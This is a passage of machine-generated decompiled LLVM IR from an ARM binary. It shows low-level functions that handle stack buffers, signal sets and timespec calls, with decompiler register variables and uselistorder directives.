  %v0_c648 = load i32, i32* %r5.global-to-local, align 4
  %v2_c64c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c64c, i32* @r4, align 4
  ret i32 %v0_c648

; uselistorder directives
  uselistorder i32 %v3_c5d8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_c59c, { 1, 0 }
  uselistorder i32 %v3_c57c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_c5c8, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_c5c0, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_c528, { 1, 0 }
  uselistorder i32* @r3, { 9, 12, 10, 11, 14, 8, 1, 7, 2, 13, 0, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_c548, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c630, { 1, 2, 0 }
  uselistorder label %dec_label_pc_c624, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_c570, { 1, 0 }
}

define i32 @function_c650() local_unnamed_addr {
dec_label_pc_c66c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_c650 = ptrtoint i32* %stack_var_-268 to i32
  %v1_c660 = call i32 @function_cdec()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_c66c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_c66c

dec_label_pc_c66c:                                ; preds = %dec_label_pc_c66c.lr.ph, %dec_label_pc_c66c
  %v1_c670 = phi i32 [ 31, %dec_label_pc_c66c.lr.ph ], [ %v1_c67c, %dec_label_pc_c66c ]
  %v4_c670 = mul i32 %v1_c670, 4
  %v5_c670 = add i32 %v4_c670, %v2_c66c
  %v2_c678 = add i32 %v5_c670, -128
  %v3_c678 = inttoptr i32 %v2_c678 to i32*
  store i32 0, i32* %v3_c678, align 4
  %v0_c67c = load i32, i32* %r1.global-to-local, align 4
  %v1_c67c = add i32 %v0_c67c, -1
  store i32 %v1_c67c, i32* %r1.global-to-local, align 4
  %v6_c67c = icmp slt i32 %v1_c67c, 0
  br i1 %v6_c67c, label %dec_label_pc_c684, label %dec_label_pc_c66c

dec_label_pc_c684:                                ; preds = %dec_label_pc_c66c
  %v2_c684 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_c684, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_c690 = call i32 @function_c1b0(i32 %v2_c684, i32 6)
  %v2_c694 = icmp eq i32 %v2_c690, 0
  br i1 %v2_c694, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c684
  store i32 %v2_c684, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c684, %bb
  store i32 50856, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_c694, i32 ptrtoint (i32* @global_var_d63c.249 to i32))
  %v2_c6ac = load i32, i32* @global_var_1746c.251, align 4
  %v2_c6b0 = icmp eq i32 %v2_c6ac, 0
  br i1 %v2_c6b0, label %dec_label_pc_c6b8, label %dec_label_pc_c6e8

dec_label_pc_c6b8:                                ; preds = %.thread1
  store i32 1, i32* @global_var_1746c.251, align 4
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c738, %dec_label_pc_c6b8
  %v1_c6cc = call i32 @function_cdec()
  %v1_c6d4 = call i32 @function_df30(i32 6)
  store i32 50920, i32* @lr, align 4
  %v1_c6e4 = call i32 @function_cdec()
  %v2_c6ec.pre = load i32, i32* @global_var_1746c.251, align 4
  br label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %.thread1, %dec_label_pc_c6c0
  %v0_c75c = phi i32 [ %v2_c6ac, %.thread1 ], [ %v2_c6ec.pre, %dec_label_pc_c6c0 ]
  store i32 ptrtoint (i32* @global_var_1746c.251 to i32), i32* %ip.global-to-local, align 4
  %v7_c6f0 = icmp eq i32 %v0_c75c, 1
  br i1 %v7_c6f0, label %dec_label_pc_c720.lr.ph, label %dec_label_pc_c754

dec_label_pc_c720.lr.ph:                          ; preds = %dec_label_pc_c6e8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1746c.251, align 4
  %v2_c70c = bitcast i32* %stack_var_-268 to i8*
  %v3_c70c = call i32 @function_be40(i8* %v2_c70c, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c720.lr.ph, %dec_label_pc_c720
  %v1_c724 = phi i32 [ 31, %dec_label_pc_c720.lr.ph ], [ %v1_c730, %dec_label_pc_c720 ]
  %v4_c724 = mul i32 %v1_c724, 4
  %v5_c724 = add i32 %v4_c724, %v2_c66c
  %v2_c72c = add i32 %v5_c724, -264
  %v3_c72c = inttoptr i32 %v2_c72c to i32*
  store i32 -1, i32* %v3_c72c, align 4
  %v0_c730 = load i32, i32* %r1.global-to-local, align 4
  %v1_c730 = add i32 %v0_c730, -1
  store i32 %v1_c730, i32* %r1.global-to-local, align 4
  %v6_c730 = icmp slt i32 %v1_c730, 0
  br i1 %v6_c730, label %dec_label_pc_c738, label %dec_label_pc_c720

dec_label_pc_c738:                                ; preds = %dec_label_pc_c720
  store i32 %v2_c650, i32* %r1.global-to-local, align 4
  %v4_c74c = call i32 @function_d0d8(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_c6c0

dec_label_pc_c754:                                ; preds = %dec_label_pc_c6e8
  %v7_c754 = icmp eq i32 %v0_c75c, 2
  br i1 %v7_c754, label %dec_label_pc_c75c, label %dec_label_pc_c768

dec_label_pc_c75c:                                ; preds = %dec_label_pc_c754
  store i32 3, i32* @global_var_1746c.251, align 4
  %v0_c764 = call i32 @function_c650()
  %v2_c768.pre = load i32, i32* @global_var_1746c.251, align 4
  br label %dec_label_pc_c768

dec_label_pc_c768:                                ; preds = %dec_label_pc_c754, %dec_label_pc_c75c
  %v1_c770 = phi i32 [ %v0_c75c, %dec_label_pc_c754 ], [ %v2_c768.pre, %dec_label_pc_c75c ]
  %v7_c76c = icmp eq i32 %v1_c770, 3
  br i1 %v7_c76c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_c768
  %v2_c778 = load i32, i32* %ip.global-to-local, align 4
  %v3_c778 = inttoptr i32 %v2_c778 to i32*
  store i32 4, i32* %v3_c778, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_c768, %bb27
  call void @__pseudo_cond_branch(i1 %v7_c76c, i32 ptrtoint (i32* @global_var_d1f0.253 to i32))
  br label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c780, %.thread3
  %v0_c780 = call i32 @function_c650()
  br label %dec_label_pc_c780

; uselistorder directives
  uselistorder i32 %v1_c730, { 2, 1, 0 }
  uselistorder i32 %v1_c67c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 7, 9, 8, 0 }
  uselistorder i32* @global_var_1746c.251, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_c768, { 1, 0 }
  uselistorder label %dec_label_pc_c720, { 1, 0 }
  uselistorder label %dec_label_pc_c6e8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c66c, { 1, 0 }
}

define i32 @function_c798(i32 %arg1) local_unnamed_addr {
dec_label_pc_c798:
  %stack_var_-16 = alloca i32, align 4
  %v2_c798 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_c798, i32* @r0, align 4
  %v8_c7b4 = call i32 @function_cdf4(i32 %v2_c798, i32 ptrtoint (i32* @global_var_cdec.209 to i32), i32 ptrtoint (i32* @global_var_173e4.256 to i32), i32 52724, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_c7c4 = call i32 @function_cdec()
  %v2_c7cc = load i32, i32* @global_var_17470.260, align 4
  %v2_c7d0 = icmp eq i32 %v2_c7cc, 0
  br i1 %v2_c7d0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_c798
  call void @__pseudo_branch(i32 %v2_c7cc)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c798, %bb
  store i32 %v2_c798, i32* @r0, align 4
  store i32 51188, i32* @lr, align 4
  %v8_c7f0 = call i32 @function_cdf4(i32 %v2_c798, i32 1, i32 ptrtoint (i32* @global_var_173e4.256 to i32), i32 52724, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_c7f0, i32* @r0, align 4
  %v1_c7f4 = call i32 @function_cd80(i32 %v8_c7f0)
  %v0_c808 = load i32, i32* @r4, align 4
  %v1_c80c = call i32 @function_d1f0(i32 %v0_c808)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_c798, { 1, 0, 3, 2 }
  uselistorder i32 ()* @function_cdec, { 4, 3, 2, 1, 17, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_cdf4, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 52724, { 1, 0, 3, 4, 2, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_173e4.256 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_cdec.209 to i32), { 0, 3, 1, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_c82c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c82c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c82c = load i32, i32* @r4, align 4
  store i32 %v3_c82c, i32* %stack_var_-20, align 4
  %v6_c82c = load i32, i32* @r5, align 4
  %v9_c82c = load i32, i32* @r6, align 4
  %v16_c82c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_c830 = icmp eq i32 %arg1, 0
  %v2_c834 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_c830, label %dec_label_pc_c9b8, label %dec_label_pc_c84c.preheader

dec_label_pc_c84c.preheader:                      ; preds = %dec_label_pc_c82c
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_c85417 = add i32 %v16_c82c, 124
  br label %dec_label_pc_c844

dec_label_pc_c844:                                ; preds = %dec_label_pc_c84c.preheader, %dec_label_pc_c844
  %v5_c85418 = phi i32 [ %v5_c85417, %dec_label_pc_c84c.preheader ], [ %v5_c854, %dec_label_pc_c844 ]
  %v2_c848 = add i32 %v5_c85418, -136
  %v3_c848 = inttoptr i32 %v2_c848 to i32*
  store i32 0, i32* %v3_c848, align 4
  %v0_c84c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_c84c = add i32 %v0_c84c.pre, -1
  store i32 %v1_c84c, i32* %r1.global-to-local, align 4
  %v6_c84c = icmp slt i32 %v1_c84c, 0
  %v4_c854 = mul i32 %v1_c84c, 4
  %v5_c854 = add i32 %v4_c854, %v16_c82c
  br i1 %v6_c84c, label %dec_label_pc_c85c, label %dec_label_pc_c844

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c844
  %v2_c85c = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_c85c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_c86c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c86c, i32* %stack_var_-28, align 4
  %v2_c874 = call i32 @function_c1b0(i32 %v2_c85c, i32 17)
  store i32 %v2_c874, i32* %r0.global-to-local, align 4
  %v1_c878 = load i32, i32* @r5, align 4
  %v5_c87c = icmp slt i32 %v2_c874, %v1_c878
  br i1 %v5_c87c, label %dec_label_pc_c9c0, label %dec_label_pc_c880

dec_label_pc_c880:                                ; preds = %dec_label_pc_c85c
  %v2_c880 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_c880, i32* @r4, align 4
  store i32 %v1_c878, i32* %r0.global-to-local, align 4
  store i32 %v2_c85c, i32* %r1.global-to-local, align 4
  %v3_c890 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_c890 = call i32 @function_d63c(i32 %v1_c878, %_TYPEDEF_sigset_t* %v3_c890, i32 %v2_c880)
  store i32 %v4_c890, i32* %r0.global-to-local, align 4
  %v1_c894 = load i32, i32* @r5, align 4
  %v9_c894 = icmp eq i32 %v4_c890, %v1_c894
  br i1 %v9_c894, label %dec_label_pc_c89c, label %dec_label_pc_c9c0

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c880
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_c880, i32* %r0.global-to-local, align 4
  %v2_c8a4 = call i32 @function_c18c(i32 %v2_c880, i32 17)
  store i32 %v2_c8a4, i32* %r0.global-to-local, align 4
  %v1_c8a8 = load i32, i32* @r5, align 4
  %v9_c8a8 = icmp eq i32 %v2_c8a4, %v1_c8a8
  br i1 %v9_c8a8, label %dec_label_pc_c8c0.preheader, label %dec_label_pc_c89c.dec_label_pc_c988_crit_edge

dec_label_pc_c89c.dec_label_pc_c988_crit_edge:    ; preds = %dec_label_pc_c89c
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_c988

dec_label_pc_c8c0.preheader:                      ; preds = %dec_label_pc_c89c
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c8b8

dec_label_pc_c8b8:                                ; preds = %dec_label_pc_c8c0.preheader, %dec_label_pc_c8b8
  %v5_c8c816 = phi i32 [ %v5_c85417, %dec_label_pc_c8c0.preheader ], [ %v5_c8c8, %dec_label_pc_c8b8 ]
  %v2_c8bc = add i32 %v5_c8c816, -136
  %v3_c8bc = inttoptr i32 %v2_c8bc to i32*
  store i32 0, i32* %v3_c8bc, align 4
  %v0_c8c0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_c8c0 = add i32 %v0_c8c0.pre, -1
  store i32 %v1_c8c0, i32* %r1.global-to-local, align 4
  %v6_c8c0 = icmp slt i32 %v1_c8c0, 0
  %v4_c8c8 = mul i32 %v1_c8c0, 4
  %v5_c8c8 = add i32 %v4_c8c8, %v16_c82c
  br i1 %v6_c8c0, label %dec_label_pc_c8d0, label %dec_label_pc_c8b8

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8b8
  store i32 %v2_c85c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_c8d8 = call i32 @function_c1b0(i32 %v2_c85c, i32 17)
  store i32 %v2_c8d8, i32* %r0.global-to-local, align 4
  %v1_c8dc = icmp slt i32 %v2_c8d8, 0
  br i1 %v1_c8dc, label %dec_label_pc_c9c0, label %dec_label_pc_c8e4

dec_label_pc_c8e4:                                ; preds = %dec_label_pc_c8d0
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_c8f0 = call i32 @function_d0d8(i32 17, i32* null, i32 %v2_c834)
  store i32 %v4_c8f0, i32* %r0.global-to-local, align 4
  %v1_c8f4 = icmp slt i32 %v4_c8f0, 0
  br i1 %v1_c8f4, label %dec_label_pc_c8fc, label %dec_label_pc_c924

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8e4
  %v0_c8fc = call i32 @function_bdd4()
  store i32 %v2_c880, i32* %r1.global-to-local, align 4
  store i32 %v0_c8fc, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_c910 = inttoptr i32 %v0_c8fc to i32*
  %v2_c910 = load i32, i32* %v1_c910, align 4
  store i32 %v2_c910, i32* @r4, align 4
  %v3_c914 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_c914 = call i32 @function_d63c(i32 2, %_TYPEDEF_sigset_t* %v3_c914, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_c91c = load i32, i32* @r4, align 4
  %v1_c91c = load i32, i32* %r5.global-to-local, align 4
  %v2_c91c = inttoptr i32 %v1_c91c to i32*
  store i32 %v0_c91c, i32* %v2_c91c, align 4
  %v17_c9c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9c4

dec_label_pc_c924:                                ; preds = %dec_label_pc_c8e4
  %v2_c924 = load i32, i32* %stack_var_-424, align 4
  %v7_c928 = icmp eq i32 %v2_c924, 1
  %v2_c930 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_c930, i32* @r4, align 4
  br i1 %v7_c928, label %dec_label_pc_c938, label %dec_label_pc_c96c

dec_label_pc_c938:                                ; preds = %dec_label_pc_c924
  store i32 %v2_c930, i32* %r1.global-to-local, align 4
  store i32 %v2_c930, i32* %r0.global-to-local, align 4
  %v2_c940 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_c940 = call i32 @function_d5b8(%timespec* %v2_c940, i32 %v2_c930)
  store i32 %v3_c940, i32* %r0.global-to-local, align 4
  store i32 %v3_c940, i32* %r6.global-to-local, align 4
  %v0_c948 = call i32 @function_bdd4()
  store i32 %v2_c880, i32* %r1.global-to-local, align 4
  store i32 %v0_c948, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_c95c = inttoptr i32 %v0_c948 to i32*
  %v2_c95c = load i32, i32* %v1_c95c, align 4
  store i32 %v2_c95c, i32* @r4, align 4
  %v3_c960 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_c960 = call i32 @function_d63c(i32 2, %_TYPEDEF_sigset_t* %v3_c960, i32 0)
  store i32 %v4_c960, i32* %r0.global-to-local, align 4
  %v0_c964 = load i32, i32* @r4, align 4
  %v1_c964 = load i32, i32* %r5.global-to-local, align 4
  %v2_c964 = inttoptr i32 %v1_c964 to i32*
  store i32 %v0_c964, i32* %v2_c964, align 4
  %v0_c994.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c994

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c924
  store i32 %v2_c880, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c978 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_c978 = call i32 @function_d63c(i32 2, %_TYPEDEF_sigset_t* %v3_c978, i32 0)
  store i32 %v4_c978, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c988

dec_label_pc_c988:                                ; preds = %dec_label_pc_c89c.dec_label_pc_c988_crit_edge, %dec_label_pc_c96c
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_c89c.dec_label_pc_c988_crit_edge ], [ %v2_c930, %dec_label_pc_c96c ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c98c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_c98c = call i32 @function_d5b8(%timespec* %v2_c98c, i32 %storemerge.pre-phi)
  store i32 %v3_c98c, i32* %r0.global-to-local, align 4
  store i32 %v3_c98c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c994

dec_label_pc_c994:                                ; preds = %dec_label_pc_c938, %dec_label_pc_c988
  %v0_c994 = phi i32 [ %v0_c994.pr, %dec_label_pc_c938 ], [ %v3_c98c, %dec_label_pc_c988 ]
  %v2_c994 = icmp eq i32 %v0_c994, 0
  br i1 %v2_c994, label %dec_label_pc_c9b8, label %dec_label_pc_c99c

dec_label_pc_c99c:                                ; preds = %dec_label_pc_c994
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c9a4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_c9a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9c4

dec_label_pc_c9b8:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c994
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9c4

dec_label_pc_c9c0:                                ; preds = %dec_label_pc_c880, %dec_label_pc_c8d0, %dec_label_pc_c85c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9c4

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_c99c, %dec_label_pc_c9b8, %dec_label_pc_c8fc, %dec_label_pc_c9c0
  %v17_c9c8 = phi i32 [ %v3_c9a4, %dec_label_pc_c99c ], [ 0, %dec_label_pc_c9b8 ], [ %v17_c9c8.pre, %dec_label_pc_c8fc ], [ -1, %dec_label_pc_c9c0 ]
  %v2_c9c8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c9c8, i32* @r4, align 4
  store i32 %v6_c82c, i32* @r5, align 4
  store i32 %v9_c82c, i32* @r6, align 4
  ret i32 %v17_c9c8

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_c930, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_c8c0, { 0, 2, 1 }
  uselistorder i32 %v2_c880, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_c878, { 1, 0, 2 }
  uselistorder i32 %v2_c85c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_c84c, { 0, 2, 1 }
  uselistorder i32 %v16_c82c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 0, 12, 13, 14, 16, 15, 1 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 1, 10, 9, 12, 11, 3, 13, 15, 16, 14, 18, 17, 20, 19, 4, 21, 2, 22, 24, 23, 0 }
  uselistorder i32 (i32, i32*, i32)* @function_d0d8, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @function_c1b0, { 2, 1, 0, 3 }
  uselistorder i32 -136, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_c9c4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_c9c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c9b8, { 1, 0 }
  uselistorder label %dec_label_pc_c994, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c844, { 1, 0 }
}

define i32 @function_c9d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_c9d0:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 150
  br i1 %tmp, label %bb, label %dec_label_pc_cc40

bb:                                               ; preds = %dec_label_pc_c9d0
  %v7_c9d8 = mul i32 %arg1, 4
  %v8_c9d8 = add i32 %v7_c9d8, ptrtoint (i32* @global_var_c9e0.264 to i32)
  %v9_c9d8 = inttoptr i32 %v8_c9d8 to i32*
  %v10_c9d8 = load i32, i32* %v9_c9d8, align 4
  call void @__pseudo_branch(i32 %v10_c9d8)
  br label %dec_label_pc_cc40

dec_label_pc_cc40:                                ; preds = %bb, %dec_label_pc_c9d0
  %v0_cc40 = call i32 @function_bdd4()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_cc4c = inttoptr i32 %v0_cc40 to i32*
  store i32 22, i32* %v2_cc4c, align 4
  %v0_cd68 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_cd68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_cd80(i32 %arg1) local_unnamed_addr {
dec_label_pc_cdac:
  %stack_var_-8 = alloca i32, align 4
  %v3_cd80 = load i32, i32* @r4, align 4
  store i32 %v3_cd80, i32* %stack_var_-8, align 4
  %v2_cdb0 = load i32, i32* @global_var_17480.273, align 4
  %v2_cdb4 = icmp eq i32 %v2_cdb0, 0
  br i1 %v2_cdb4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_cdac
  store i32 52672, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_cdb0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cdac, %bb
  %v2_cdc4 = load i32, i32* @global_var_17484.275, align 4
  %v2_cdc8 = icmp eq i32 %v2_cdc4, 0
  br i1 %v2_cdc8, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_cdcc = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_cdcc, i32* @r4, align 4
  %v9_cdcc = load i32, i32* @r0, align 4
  ret i32 %v9_cdcc

bb13:                                             ; preds = %.thread
  store i32 ptrtoint (i32* @global_var_cdd8.276 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_cdc4)
  %v2_cdd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cdd8, i32* @r4, align 4
  %v8_cdd8 = load i32, i32* @r0, align 4
  ret i32 %v8_cdd8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_cdec() local_unnamed_addr {
dec_label_pc_cdec:
  ret i32 0
}

define i32 @function_cdf4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_cdf4:
  %v1_cdf4 = load i32, i32* @r0, align 4
  ret i32 %v1_cdf4
}

define i32 @function_cdf8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cdf8:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_cdf8 = load i32, i32* @r4, align 4
  store i32 %v3_cdf8, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_ce08 = call i32 @function_b790(i32 %arg1, i32 1)
  %v7_ce0c = icmp eq i32 %v2_ce08, -1
  br i1 %v7_ce0c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_cdf8
  %v3_ce10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ce10, i32* @r4, align 4
  ret i32 %v2_ce08

bb4:                                              ; preds = %dec_label_pc_cdf8
  %v0_ce14 = load i32, i32* @r4, align 4
  %v4_ce1c = call i32 @function_b9b0(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_f270.278, i32 0, i32 0), i32 %v0_ce14)
  %v1_ce20 = load i32, i32* %r5.global-to-local, align 4
  %v9_ce20 = icmp eq i32 %v4_ce1c, %v1_ce20
  br i1 %v9_ce20, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_ce24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ce24, i32* @r4, align 4
  ret i32 %v4_ce1c

bb6:                                              ; preds = %bb4
  %v0_ce28 = call i32 @function_c650()
  %v0_ce2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ce2c, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v3_ce2c = load i32, i32* @r2, align 4
  %v4_ce2c = lshr i32 %v0_ce28, %v3_ce2c
  %v5_ce2c = sub i32 32, %v3_ce2c
  %v6_ce2c = shl i32 %v0_ce28, %v5_ce2c
  %v7_ce2c = or i32 %v6_ce2c, %v4_ce2c
  %v9_ce2c = and i32 %v7_ce2c, %v0_ce28
  call void @__pseudo_branch(i32 %v9_ce2c)
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_ce28

; uselistorder directives
  uselistorder i32 %v0_ce28, { 3, 0, 1, 2 }
  uselistorder i32 %v2_ce08, { 1, 0 }
  uselistorder i1* @cpsr_z, { 8, 0, 9, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_c650, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_b9b0, { 3, 1, 0, 2 }
  uselistorder i32 (i32, i32)* @function_b790, { 0, 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_ce30(i32 %arg1) local_unnamed_addr {
dec_label_pc_ce30:
  %v2_ce34 = load i32, i32* @global_var_17488.280, align 4
  %v2_ce38 = icmp eq i32 %v2_ce34, 0
  br i1 %v2_ce38, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_ce30
  %v6_ce44 = load i32, i32* @r0, align 4
  ret i32 %v6_ce44

bb2:                                              ; preds = %dec_label_pc_ce30
